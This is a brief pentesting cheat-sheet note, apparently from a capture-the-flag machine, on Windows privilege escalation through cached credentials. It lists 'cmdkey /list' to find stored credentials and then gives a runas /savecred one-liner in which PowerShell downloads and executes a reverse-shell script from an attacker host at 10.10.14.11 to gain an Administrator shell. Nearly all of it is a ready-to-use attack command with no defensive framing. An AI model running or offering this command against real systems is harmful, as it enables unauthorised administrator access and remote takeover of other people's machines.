## Runas command
- run `cmdkey /list` to find which users creds are cached.
- If admin cached, can use runsas just like sudo - just host a server, set a listener and boom: 
```
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/reverse_shell.ps1')"
```
